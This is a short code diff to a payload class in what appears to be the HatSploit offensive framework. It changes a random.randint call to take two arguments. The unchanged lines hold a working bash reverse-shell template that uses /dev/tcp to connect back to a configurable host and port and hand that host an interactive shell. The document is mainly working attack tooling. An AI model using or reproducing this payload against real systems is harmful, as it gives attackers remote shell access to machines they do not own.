@@ -47,7 +47,7 @@ class HatSploitPayload(Payload):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        fd = random.randint(200)
+        fd = random.randint(0, 200)
         payload = f"bash -c '0<&{fd}-;exec {fd}<>/dev/tcp/{connback_host}/{connback_port};sh <&{fd} >&{fd} 2>&{fd}' &"
 
         return payload
